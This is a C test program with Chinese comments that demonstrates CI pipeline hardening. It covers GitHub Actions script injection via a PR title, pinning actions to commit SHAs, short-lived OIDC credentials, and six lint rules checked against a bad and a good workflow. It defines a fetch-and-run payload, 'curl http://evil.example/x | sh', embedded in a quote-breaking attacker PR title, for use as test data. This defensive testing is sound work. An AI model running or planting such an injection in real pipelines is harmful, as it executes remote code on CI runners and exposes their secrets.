/* CI 流水线加固（C 版）：脚本注入渲染、action 固定、凭据窗口、六条 lint 规则。
 *
 * C 版没有正则，「不受信任表达式」用子串 "${{ github.event." 判定，
 * 「完整 commit SHA 固定」用 '@' 后跟 40 个十六进制字符判定；判据与 Python / Go 一致。
 */
#include <stdio.h>
#include <string.h>
#include <ctype.h>

#define DANGEROUS "curl http://evil.example/x | sh"
#define ATTACKER_TITLE "a\"; " DANGEROUS " #"   /* 攻击者的 PR 标题 */
#define UNTRUSTED "${{ github.event."
#define OFFICIAL_SHA "a1b2c3d4e5f60718293a4b5c6d7e8f9012345678"
#define MOVED_SHA   "0000000000000000000000000000000000000bad"

#define LONG_LIVED_TTL (10 * 365 * 24 * 3600)
#define OIDC_TTL       (15 * 60)
#define LEAK_AT        120

#define MAXJ 2
#define MAXA 2
#define MAXF 8
#define MAXS 256

/* ------------------------------------------------ 1. run 步骤渲染 */

/* 把模板里的 UNTRUSTED 子串替换成 repl，写入 out */
static void render_run(const char *tmpl, const char *repl, char out[MAXS]) {
    const char *hit = strstr(tmpl, UNTRUSTED);
    char buf[MAXS];
    int head;
    if (!hit) { strcpy(out, tmpl); return; }
    head = (int)(hit - tmpl);
    memcpy(buf, tmpl, head);
    buf[head] = 0;
    strcat(buf, repl);
    /* 跳过到 '}' 为止 */
    {
        const char *p = strchr(hit, '}');
        strcat(buf, p ? p + 1 : "");
    }
    strcpy(out, buf);
}

/* marker 是否出现在引号之外：按 '"' 切分，偶数段即引号外 */
static int outside_quotes_contains(const char *s, const char *marker) {
    int idx = 0;
    const char *seg = s;
    while (seg) {
        const char *next = strchr(seg, '"');
        int len = next ? (int)(next - seg) : (int)strlen(seg);
        char buf[MAXS];
        memcpy(buf, seg, len);
        buf[len] = 0;
        if (idx % 2 == 0 && strstr(buf, marker)) return 1;
        if (!next) break;
        seg = next + 1;
        idx++;
    }
    return 0;
}

/* ------------------------------------------------ 2. action 固定 */

static int is_hex40(const char *s) {
    int i;
    if (strlen(s) != 40) return 0;
    for (i = 0; i < 40; i++)
        if (!isxdigit((unsigned char)s[i]) || isupper((unsigned char)s[i])) return 0;
    return 1;
}

static const char *resolve_action(const char *ref, int moved) {
    const char *at = strrchr(ref, '@');
    if (at && is_hex40(at + 1)) return at + 1;   /* 完整 SHA：不可变 */
    return moved ? MOVED_SHA : OFFICIAL_SHA;     /* tag：可被移动 */
}

/* ------------------------------------------------ 3. 凭据窗口 */

static int exposure_window(int ttl, int leak) { return ttl - leak > 0 ? ttl - leak : 0; }

/* ------------------------------------------------ 4. lint */

typedef struct {
    const char *run;
    const char *checkout_ref;
    int uses_cache;
    const char *actions[MAXA];
    int nactions;
    int long_lived_secret;
} Job;

typedef struct {
    const char *name;
    const char *on[MAXJ];
    int non;
    int perms_explicit;     /* 1 = 已显式配置最小权限 */
    int perms_write_all;
    Job jobs[MAXJ];
    int njobs;
} Workflow;

typedef struct { const char *severity; const char *id; } Finding;

static int privileged_of(const Workflow *w) {
    int i;
    for (i = 0; i < w->non; i++)
        if (!strcmp(w->on[i], "pull_request_target") || !strcmp(w->on[i], "workflow_run"))
            return 1;
    return 0;
}

static int has_untrusted(const char *s) { return s && strstr(s, UNTRUSTED) != NULL; }

static int lint(const Workflow *w, Finding out[MAXF]) {
    int n = 0, i, j, priv = privileged_of(w);
    for (i = 0; i < w->njobs; i++) {
        const Job *jb = &w->jobs[i];
        if (jb->run && has_untrusted(jb->run))
            out[n++] = (Finding){"CRITICAL", "R1-script-injection"};
        if (priv && has_untrusted(jb->checkout_ref))
            out[n++] = (Finding){"CRITICAL", "R2-untrusted-checkout"};
        if (priv && jb->uses_cache)
            out[n++] = (Finding){"HIGH", "R3-cache-poisoning"};
    }
    if (!w->perms_explicit || w->perms_write_all)
        out[n++] = (Finding){"MEDIUM", "R4-token-permissions"};
    for (i = 0; i < w->njobs; i++)
        for (j = 0; j < w->jobs[i].nactions; j++) {
            const char *a = w->jobs[i].actions[j];
            const char *at = strrchr(a, '@');
            if (strncmp(a, "third-party/", 12) == 0 && !(at && is_hex40(at + 1)))
                out[n++] = (Finding){"MEDIUM", "R5-unpinned-action"};
        }
    for (i = 0; i < w->njobs; i++)
        if (w->jobs[i].long_lived_secret)
            out[n++] = (Finding){"MEDIUM", "R6-long-lived-secret"};
    return n;
}

static int has_id(Finding *fs, int n, const char *id) {
    int i;
    for (i = 0; i < n; i++) if (!strcmp(fs[i].id, id)) return 1;
    return 0;
}

static int failures = 0;

static void check(const char *label, int cond, const char *detail) {
    if (!cond) { printf("FAIL: %s %s\n", label, detail ? detail : ""); failures++; }
}

static const Workflow BAD = {
    "bad", {"pull_request_target"}, 1, 0, 0,
    {{"echo \"title: ${{ github.event.pull_request.title }}\"",
      "${{ github.event.pull_request.head.sha }}", 1, {"third-party/publish@v3"}, 1, 1}}, 1};

static const Workflow GOOD = {
    "good", {"pull_request"}, 1, 1, 0,
    {{"echo \"title: $TITLE\"", "", 0, {"third-party/publish@" OFFICIAL_SHA}, 1, 0}}, 1};

int main(void) {
    char script[MAXS], safe[MAXS], benign[MAXS];
    Finding fs[MAXF];
    int n;

    /* 1) 脚本注入 */
    render_run("echo \"PR title: ${{ github.event.pull_request.title }}\"",
               ATTACKER_TITLE, script);
    render_run("echo \"PR title: ${{ github.event.pull_request.title }}\"",
               "$TITLE", safe);
    check("就地插值把载荷写进脚本", strstr(script, DANGEROUS) != NULL, script);
    check("载荷落在引号外", outside_quotes_contains(script, "curl"), script);
    check("env 方式脚本无载荷", strstr(safe, DANGEROUS) == NULL, safe);
    check("env 方式引用 $TITLE", strstr(safe, "$TITLE") != NULL, safe);
    render_run("echo \"PR title: ${{ github.event.pull_request.title }}\"",
               "refactor: cleanup", benign);
    check("正常标题不构成注入", !outside_quotes_contains(benign, "curl"), benign);

    /* 2) action 固定 */
    check("tag 正常解析", !strcmp(resolve_action("third-party/publish@v3", 0), OFFICIAL_SHA), "");
    check("tag 被移动后变化", strcmp(resolve_action("third-party/publish@v3", 1), OFFICIAL_SHA) != 0, "");
    check("SHA 固定不受影响",
          !strcmp(resolve_action("third-party/publish@" OFFICIAL_SHA, 1), OFFICIAL_SHA), "");

    /* 3) 凭据窗口 */
    check("OIDC 窗口远小于长期 secret",
          exposure_window(OIDC_TTL, LEAK_AT) < exposure_window(LONG_LIVED_TTL, LEAK_AT) / 1000, "");
    check("超过 TTL 归零", exposure_window(OIDC_TTL, OIDC_TTL + 1) == 0, "");

    /* 4) lint */
    n = lint(&BAD, fs);
    printf("bad findings (%d):", n);
    { int i; for (i = 0; i < n; i++) printf(" %s", fs[i].id); }
    printf("\n");
    check("坏流水线 6 条", n == 6, "");
    check("命中 R1", has_id(fs, n, "R1-script-injection"), "");
    check("命中 R2", has_id(fs, n, "R2-untrusted-checkout"), "");
    check("命中 R3", has_id(fs, n, "R3-cache-poisoning"), "");
    check("命中 R4", has_id(fs, n, "R4-token-permissions"), "");
    check("命中 R5", has_id(fs, n, "R5-unpinned-action"), "");
    check("命中 R6", has_id(fs, n, "R6-long-lived-secret"), "");

    n = lint(&GOOD, fs);
    check("好流水线零告警", n == 0, "");

    if (failures) { printf("FAILED %d\n", failures); return 1; }
    printf("all checks passed\n");
    return 0;
}
